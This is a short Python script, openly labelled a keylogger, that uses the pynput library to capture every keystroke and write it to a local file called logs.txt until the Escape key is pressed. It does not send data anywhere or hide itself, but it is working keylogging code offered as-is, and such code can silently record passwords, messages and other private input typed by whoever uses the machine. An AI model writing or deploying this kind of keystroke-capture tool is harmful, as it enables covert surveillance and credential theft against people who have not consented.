from pynput import keyboard
import sys
import os
import time

logfile = "logs.txt"
print("[+] Keylogger started")
writer = open(logfile, "w")
reader = open(logfile, "r")
curr_time = time.ctime(time.time())
writer.write("logs create on "+ str(curr_time)+"\n")
writer.write("=========================================================\n")

def on_press(key):
    # print('Key {} pressed.'.format(key))
    # writer.write("{}".format(str(key)))
    str_key = str(key).replace("'", "")
    if str(key) == 'Key.backspace':
        writer.seek(writer.tell() - 1, os.SEEK_SET)
        writer.write('')
    elif str(key) == 'Key.enter':
        writer.write("\n")
    elif str(key) == 'Key.space':
        writer.write(" ")
    elif str(key) == 'Key.esc':
        writer.write("\n=========================================\nExiting")
        pass

    else:
        writer.write(str_key)


def on_release(key):
    # print('Key {} released.'.format(key))
    if str(key) == 'Key.esc':
        print('Exiting...')
        writer.close()
        reader.close()
        return False

try:
    with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("[+] Exiting")
    sys.exit(0)